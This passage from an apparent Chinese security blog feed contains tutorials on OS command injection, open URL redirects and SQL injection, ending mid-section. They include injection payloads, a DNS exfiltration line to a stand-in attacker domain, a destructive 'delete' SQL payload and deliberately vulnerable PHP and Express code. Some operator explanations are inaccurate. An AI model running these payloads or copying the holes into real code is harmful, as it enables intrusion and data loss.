        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="TCl7Y"></a></p><h2 id="什么是操作系统命令注入？"><a href="#什么是操作系统命令注入？" class="headerlink" title="什么是操作系统命令注入？"></a>什么是操作系统命令注入？</h2><p>OS 命令注入（也称为 shell 注入）是一种 Web 安全漏洞，<strong>允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令</strong>，并且通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。</p><p><a name="XYwqu"></a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单来说就是因为 SQL 是一种结构化字符串语言，攻击者利用可以随意构造语句的漏洞构造了开发者意料之外的语句。<br />OS 注入攻击是指程序提供了直接执行 Shell 命令的函数的场景，当攻击者不合理使用，且开发者对用户参数未考虑安全因素的话，就会执行恶意的命令调用，被攻击者利用。</p><p><a name="nTJ2N"></a></p><h2 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a>执行任意命令</h2><p>考虑一个购物应用程序，它允许用户查看特定商店中某件商品是否有货。此信息可通过以下 URL 访问：<br /><code>https:_//insecure-website.com/stockStatus?productID=381&amp;storeID=29_ </code></p><p>为了提供股票信息，应用程序必须查询各种遗留系统。由于历史原因，该功能是通过调用带有产品和存储 ID 作为参数的 shell 命令来实现的：<br /><code>stockreport.pl 381 29 </code><br />此命令输出指定项目的库存状态，并返回给用户。</p><p>由于应用程序没有针对操作系统命令注入实施防御，攻击者可以提交以下输入来执行任意命令：<br /><code>&amp; echo aiwefwlguh &amp; </code><br />如果在 productID 参数中提交了这个输入，那么应用程序执行的命令是：<br /><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29 </code><br />该 echo 命令只是使提供的字符串在输出中回显，并且是测试某些类型的操作系统命令注入的有用方法。<strong>该&amp;字符是一个 shell 命令分隔符</strong>，因此执行的实际上是三个单独的命令一个接一个。结果，返回给用户的输出是：<br /><code>Error - productID was not provided </code><br /><code>aiwefwlguh </code><br /><code>29: command not found </code></p><p>三行输出表明：</p><ul><li>原始 stockreport.pl 命令在没有预期参数的情况下执行，因此返回了一条错误消息。</li><li>echo 执行 注入的命令，并在输出中回显提供的字符串。</li><li>原始参数 29 作为命令执行，导致错误。</li></ul><p>&amp;在注入的命令之后 放置额外的命令分隔符通常很有用，因为它将注入的命令与注入点之后的任何内容分开。这降低了以下内容阻止执行注入的命令的可能性。<br /><code>command1 &amp; command2 </code>：两个命令都执行<br /><code>command1 &amp;&amp; command2 </code>：与执行，第一个成功执行第二个才会执行<br /><code>command1 | command2</code> ：或执行，只执行第二个 command1 ||<br /><code>command2</code>：第一个执行成功，第二个不执行。第一个执行失败，第二个执行</p><p><a name="vtIsx"></a></p><h2 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h2><p>当您发现操作系统命令注入漏洞时，执行一些初始命令以获取有关您已入侵的系统的信息通常很有用。下面总结了一些在 Linux 和 Windows 平台上有用的命令：</p><table><thead><tr><th>命令的目的</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>当前用户名</td><td>whoami</td><td>whoami</td></tr><tr><td>操作系统</td><td>uname -a</td><td>ver</td></tr><tr><td>网络配置</td><td>ifconfig</td><td>ipconfig &#x2F;all</td></tr><tr><td>网络连接</td><td>netstat -an</td><td>netstat -an</td></tr><tr><td>运行进程</td><td>ps -ef</td><td>tasklist</td></tr></tbody></table><p><a name="sc3AS"></a></p><h2 id="盲操作系统命令注入漏洞"><a href="#盲操作系统命令注入漏洞" class="headerlink" title="盲操作系统命令注入漏洞"></a>盲操作系统命令注入漏洞</h2><p>操作系统命令注入的许多实例都是<strong>盲漏洞</strong>。这意味着应用程序不会在其 HTTP 响应中返回命令的输出。仍然可以利用盲点漏洞，但需要不同的技术。<br />考虑一个允许用户提交有关该站点的反馈的网站。用户输入他们的电子邮件地址和反馈消息。然后，服务器端应用程序生成一封包含反馈的电子邮件给站点管理员。为此，它 mail 使用提交的详细信息调用程序。例如：<br /><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code> <br />mail 命令 的输出（如果有）<strong>不会在应用程序的响应中返回</strong>，因此使用 echo 有效负载将无效。在这种情况下，您可以使用各种其他技术来检测和利用漏洞。</p><p><a name="sPdhC"></a></p><h2 id="使用时间延迟检测盲操作系统命令注入"><a href="#使用时间延迟检测盲操作系统命令注入" class="headerlink" title="使用时间延迟检测盲操作系统命令注入"></a>使用时间延迟检测盲操作系统命令注入</h2><p>您可以使用将触发时间延迟的注入命令，允许您根据应用程序响应所需的时间来确认命令已执行。该 ping 命令是执行此操作的有效方法，因为它允许您指定要发送的 ICMP 数据包的数量，以及运行该命令所需的时间：<br /><code>&amp; ping -c 10 127.0.0.1 &amp; </code><br />此命令将导致应用程序 ping 10 秒</p><p><a name="t08I0"></a></p><h2 id="通过重定向输出来利用盲操作系统命令注入"><a href="#通过重定向输出来利用盲操作系统命令注入" class="headerlink" title="通过重定向输出来利用盲操作系统命令注入"></a>通过重定向输出来利用盲操作系统命令注入</h2><p>您可以将注入命令的输出重定向到 Web 根目录中的文件中，然后您可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源&#x2F;var&#x2F;www&#x2F;static，那么您可以提交以下输入：<br /><code>&amp; whoami &gt; /var/www/static/whoami.txt &amp; </code><br />该&gt;字符将 whoami 命令的输出发送到指定的文件。然后，您可以使用浏览器获取<a href="https://vulnerable-website.com/whoami.txt%E6%96%87%E4%BB%B6%E4%BB%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt文件以检索文件，并查看注入命令的输出。</a></p><p><a name="UhXDH"></a></p><h2 id="使用带外-OAST-技术利用-OS-命令盲注入"><a href="#使用带外-OAST-技术利用-OS-命令盲注入" class="headerlink" title="使用带外 ( OAST ) 技术利用 OS 命令盲注入"></a>使用带外 ( OAST ) 技术利用 OS 命令盲注入</h2><p>您可以使用注入的命令，使用 OAST 技术触发与您控制的系统的带外网络交互。例如：<br /><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp; </code><br />此有效负载使用该 nslookup 命令对指定域进行 DNS 查找。攻击者可以监视指定的查找发生，从而检测到命令已成功注入。<br />带外通道还提供了一种从注入的命令中提取输出的简单方法：<br /><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp; </code><br />这将导致对包含 whoami 命令结果的攻击者域进行 DNS 查找：<br /><code>wwwuser.kgji2ohoyw.web-attacker.com </code></p><p><a name="WsLxH"></a></p><h2 id="注入操作系统命令的方式"><a href="#注入操作系统命令的方式" class="headerlink" title="注入操作系统命令的方式"></a>注入操作系统命令的方式</h2><p>多种 shell 元字符可用于执行操作系统命令注入攻击。<br />许多字符用作命令分隔符，允许将命令链接在一起。以下命令分隔符适用于基于 Windows 和 Unix 的系统：</p><ul><li>&amp;</li><li>&amp;&amp;</li><li>|</li><li>||</li></ul><p>以下命令分隔符仅适用于基于 Unix 的系统：</p><ul><li>;</li></ul><p>换行符（0x0a 或\n）<br />在基于 Unix 的系统上，您还可以使用反引号或美元字符在原始命令中执行注入命令的内联执行：<br /><code>注入命令</code> <br />$( 注入命令 ) <br />请注意，不同的 shell 元字符具有细微的不同行为，这些行为可能会影响它们是否在某些情况下工作，以及它们是否允许带内检索命令输出或仅对盲目利用有用。<br />有时，您控制的输入会出现在原始命令的引号内。在这种情况下，您需要在使用合适的 shell 元字符注入新命令之前终止<strong>引用的上下文（使用”或’）。</strong><br><a name="hoKto"></a></p><h2 id="如何防止操作系统命令注入攻击"><a href="#如何防止操作系统命令注入攻击" class="headerlink" title="如何防止操作系统命令注入攻击"></a>如何防止操作系统命令注入攻击</h2><p>迄今为止，以防止操作系统命令注入漏洞的最有效的方法是从未调出从应用层代码 OS 命令。在几乎所有情况下，存在使用安全平台 API 实现所需功能的替代方式。<br />如果认为使用用户提供的输入调用操作系统命令不可避免，则必须执行强输入验证。有效验证的一些例子包括：</p><ul><li>验证针对允许值的白名单。</li><li>验证输入是否为数字。</li><li>验证输入仅包含字母数字字符，没有其他语法或空格。</li></ul><p>永远不要试图通过转义 shell 元字符来清理输入。实际上，这太容易出错并且容易被熟练的攻击者绕过。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL跳转漏洞</title>
      <link href="/2023/06/29/frontend/security/url-tiao-zhuan-lou-dong/"/>
      <url>/2023/06/29/frontend/security/url-tiao-zhuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>定义：借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。</p><p><a name="i8RfN"></a></p><h2 id="1-URL-跳转漏洞原理"><a href="#1-URL-跳转漏洞原理" class="headerlink" title="1.URL 跳转漏洞原理"></a>1.URL 跳转漏洞原理</h2><p><br />黑客利用 URL 跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在 QQ 群或者是浏览量多的贴吧&#x2F;论坛中。 安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。 <br />恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。 <br />诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？<br /><a href="http://gate.baidu.com/index?act=go&url=http://t.cn/RVTatrd">http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrd</a> <a href="http://qt.qq.com/safecheck.html?flag=1&url=http://t.cn/RVTatrd">http://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrd</a> <a href="http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd">http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd</a> <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902247404-19b2acfc-69ed-4c1e-b698-f11104423c84.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_21,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902247404-19b2acfc-69ed-4c1e-b698-f11104423c84.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_21,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902255013-9510b295-e313-4d70-bc9e-c60ca47a4f47.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_25,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902255013-9510b295-e313-4d70-bc9e-c60ca47a4f47.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_25,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="ttIL5"></a></p><h2 id="2-实现方式"><a href="#2-实现方式" class="headerlink" title="2.实现方式"></a><br />2.实现方式</h2><p><br />●Header 头跳转<br />●Javascript 跳转<br />●META 标签跳转<br />这里我们举个 Header 头跳转实现方式：<br /><?php $url=$_GET['jumpto']; header("Location: $url"); ?></p><p><a href="http://www.wooyun.org/login.php?jumpto=http://www.evil.com">http://www.wooyun.org/login.php?jumpto=http://www.evil.com</a> <br />这里用户会认为<a href="http://www.wooyun.org都是可信的,但是点击上述链接将导致用户最终访问www.evil.com这个恶意网址./">www.wooyun.org都是可信的，但是点击上述链接将导致用户最终访问www.evil.com这个恶意网址。</a><br><a name="HK6o7"></a></p><h2 id="3-如何防御"><a href="#3-如何防御" class="headerlink" title="3.如何防御"></a><br />3.如何防御</h2><p><br /><strong>1)referer 的限制</strong><br />如果确定传递 URL 参数进入的来源，我们可以通过该方式实现安全限制，保证该 URL 的有效性，避免恶意用户自己生成跳转链接</p><p><strong>2)加入有效性验证 Token</strong><br />我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的 Token 对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入攻击</title>
      <link href="/2023/06/29/frontend/security/sql-zhu-ru-gong-ji/"/>
      <url>/2023/06/29/frontend/security/sql-zhu-ru-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="5b3b2e1e"></a></p><h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p><a name="e05dce83"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SQL 注入攻击是黑客对数据库进行攻击的常用手段之一，不论是在 WEB 领域还是其它领域。攻击发生的原因依然是信任问题，开发人员信任用户输入，未对用户输入进行合法性检查，使应用程序存在安全隐患。譬如最常见的搜索功能，用户输入一段信息至后台进行数据库查询，当用户输入的信息中含有 SQL 语句时而后台未做安全检查时，该语句可能会被直接执行，这就是 SQL Injection。</p><p>SQL 注入攻击是从正常的 WWW 端口访问，而且表面看起来与一般的 Web 页面访问没什么区别，所以市面的防火墙都不会对 SQL 注入发出警报，如果管理员没查看日志的习惯，可能被入侵很长时间都不会发觉。但是，SQL 注入的手法相当灵活，在注入的时候会碰到很多意外的情况，需要构造巧妙的 SQL 语句，从而成功获取想要的数据或者操作。</p><p>注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件，第一个是用户能够控制输入；第二个是原本程序要执行的代码，拼接了用户输入的数据。</p><p>从根本上来说，解决 SQL 注入攻击的方法依然是不要信任用户的任何数据输入。</p><p><a name="69dc9919"></a></p><h3 id="攻击例子"><a href="#攻击例子" class="headerlink" title="攻击例子"></a>攻击例子</h3><p>下面一个通过 id 搜索学生数据页面:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913319491-8cd737e2-2cfd-45cc-8c6e-e3c33d05544b.png#height=153&id=GGGfs&originHeight=153&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5035&status=done&style=none&title=&width=432" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913319491-8cd737e2-2cfd-45cc-8c6e-e3c33d05544b.png#height=153&id=GGGfs&originHeight=153&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5035&status=done&style=none&title=&width=432" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="1.png"></p><p>该数据库中所拥有的数据:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913324595-f723dc13-e892-4634-89af-1cd9cff56248.png#height=197&id=pCOxd&originHeight=197&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9358&status=done&style=none&title=&width=698" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913324595-f723dc13-e892-4634-89af-1cd9cff56248.png#height=197&id=pCOxd&originHeight=197&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9358&status=done&style=none&title=&width=698" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="2.png"></p><p>当点击搜索按钮时，页面往服务器发送请求，服务器根据 id 字段进行搜索并返回结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//localhost:3000/getStudentById?id=1</span></span><br><span class="line"></span><br><span class="line">请求: <span class="attr">http</span>: 结果: [&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;小明&quot;</span>, <span class="attr">sex</span>: <span class="string">&quot;男&quot;</span> &#125;];</span><br></pre></td></tr></table></figure><p>从上述的请求中可以攻击者猜测：服务器根据 id 进行数据库的查询操作，极有可能表明查询的表中含有 id 字段。随后攻击者猜测表名，在输入框中插入了一条删除数据的 SQL：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">delete</span> <span class="keyword">from</span> <span class="title class_">Student</span> where id = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>执行结果：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913333179-6bfbbd06-9e61-467f-bcbe-97145867d67c.png#height=308&id=UKtUd&originHeight=308&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14887&status=done&style=none&title=&width=415" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913333179-6bfbbd06-9e61-467f-bcbe-97145867d67c.png#height=308&id=UKtUd&originHeight=308&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14887&status=done&style=none&title=&width=415" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="3.png"></p><p>此时查看数据库：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913339678-6b85f57a-2353-4734-8ed7-002c693959e6.png#height=141&id=JJbL6&originHeight=141&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8520&status=done&style=none&title=&width=686" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913339678-6b85f57a-2353-4734-8ed7-002c693959e6.png#height=141&id=JJbL6&originHeight=141&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8520&status=done&style=none&title=&width=686" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="4.png"></p><p>可以发现<code>id=2</code>的学生信息已经被删除。</p><p>查看后台的编写代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&quot;mysql&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//创建 connection</span></span><br><span class="line"><span class="keyword">const</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&quot;********&quot;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&quot;test&quot;</span>, <span class="comment">//数据库名</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">3306</span>, <span class="comment">//端口号</span></span><br><span class="line">  <span class="attr">multipleStatements</span>: <span class="literal">true</span>, <span class="comment">// 允许执行多条执行语句</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跨域设置</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;*&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">//设置允许跨域的域名，代表允许任意域名跨域</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="comment">//允许的header类型</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;content-type&quot;</span>);</span><br><span class="line">  <span class="comment">//跨域允许的请求方式</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;DELETE,PUT,POST,GET,OPTIONS&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;options&quot;</span>)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="number">200</span>); <span class="comment">//让options尝试请求快速结束</span></span><br><span class="line">  <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/getStudentById&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">&quot;select * from student where id = &quot;</span> + req.<span class="property">query</span>.<span class="property">id</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">  <span class="comment">// 获取所有的数据</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rows, fields</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="comment">// throw err</span></span><br><span class="line">      res.<span class="title function_">send</span>(err); <span class="comment">// 如果开启了错误回显</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(rows);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务已启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中关键语句:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sql = <span class="string">&quot;select * from student where id = &quot;</span> + req.<span class="property">query</span>.<span class="property">id</span>;</span><br></pre></td></tr></table></figure><p>SQL 语句是通过用户输入与现有字符拼接而成的，如果用户输入类似<code>1;delete from Student where id = 2</code>的查询字符，则会被拼接成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;select * from student where id = 1;delete from Student where id = 2&#x27;</span><br></pre></td></tr></table></figure><p>然后被 query()方法执行。</p><p>虽然攻击者无从得知表名，在构造 SQL 时稍有困难，但是搜索并不会因为执行错误而禁止再次执行，所以攻击者可以无限猜测，风险仍然是存在的。另外，在上述的后台程序中，当 query()执行错误时，会把错误信息返回至请求结果中，攻击者则可以通过故意触发查询错误而获取敏感信息，假如搜索框中输入单引号<code>&#39;</code>并执行搜索，则返回如下信息：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913354842-dcf4f6ae-b929-418b-8125-0d2b28df36c9.png#height=320&id=wsJqz&originHeight=320&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38159&status=done&style=none&title=&width=1389" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913354842-dcf4f6ae-b929-418b-8125-0d2b28df36c9.png#height=320&id=wsJqz&originHeight=320&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38159&status=done&style=none&title=&width=1389" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="5.png"></p><p>其中 sql 字段直接暴露了表名，也直接表明了该接口存在漏洞，会执行外部输入的 SQL 语句（正常的请求下应该根据<code>id=&#39;</code>进行搜索并返回空的数组）。</p><p><a name="8bfa7e6a"></a></p><h3 id="盲注攻击"><a href="#盲注攻击" class="headerlink" title="盲注攻击"></a>盲注攻击</h3><p>很多时候，服务器并不会直接把错误返回给 web，这样就避免了敏感信息的暴露并且使攻击者难以判断注入的 SQL 是否被执行。但是关闭了错误回显就能避免 SQL 攻击了吗？答案使否定的。</p><p>这里依然使用上述攻击例子的 web 网站来进行测试，我们在搜索框中输入<code>1 and 1=2</code>并且执行搜索:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913361087-7b9494b7-50f0-4c1c-ab08-23dff4627cd3.png#height=56&id=BAShA&originHeight=56&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2925&status=done&style=none&title=&width=373" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913361087-7b9494b7-50f0-4c1c-ab08-23dff4627cd3.png#height=56&id=BAShA&originHeight=56&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2925&status=done&style=none&title=&width=373" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="6.png"></p><p>请求结果:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913365261-fba758b6-0aa2-41f1-8626-a7ef94d09e76.png#height=244&id=Vcqpx&originHeight=244&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20255&status=done&style=none&title=&width=662" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913365261-fba758b6-0aa2-41f1-8626-a7ef94d09e76.png#height=244&id=Vcqpx&originHeight=244&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20255&status=done&style=none&title=&width=662" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="7.png"></p><p>可以看到搜索结果返回了一个空数组，这是正常的。然后继续在搜索框中输入<code>1 and 1=1</code>并且执行搜索:<img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913378627-e03283e8-860c-4d80-8453-eb243c97bfae.png#height=51&id=qxJ2Z&originHeight=51&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2824&status=done&style=none&title=&width=353" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913378627-e03283e8-860c-4d80-8453-eb243c97bfae.png#height=51&id=qxJ2Z&originHeight=51&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2824&status=done&style=none&title=&width=353" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="8.png"></p><p>请求结果:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913383906-b5cdfb1e-986c-45d7-a883-ce64390ecdc4.png#height=260&id=PoBOF&originHeight=260&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19744&status=done&style=none&title=&width=507" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913383906-b5cdfb1e-986c-45d7-a883-ce64390ecdc4.png#height=260&id=PoBOF&originHeight=260&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19744&status=done&style=none&title=&width=507" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="9.png"></p><p>这次却不正常地返回了数据，由此可以猜测，第一次搜索<code>1 and 1=2</code>时，由于<code>1=2</code>永远不成立，导致 SQL 执行<code>and</code>的运算时错误，而搜索<code>1 and 1=1</code>时，<code>1=1</code>恒成立，SQL 正常执行，返回了搜索数据，所以可以判定此接口漏洞存在，能够注入 SQL 并执行。</p><p>除了上述通过页面请求结果差异化来判断是否存在 SQL 注入漏洞，还可以利用 SQL 执行时间的差异化进行判断，这类型的盲注攻击也称为 Timing Attack。</p><p>在 Mysql 数据库中，有一个 BENCHMARK()函数，它是用于测试函数性能的。它有两个参数：</p><figure class="highlight sql"><table><tr><td 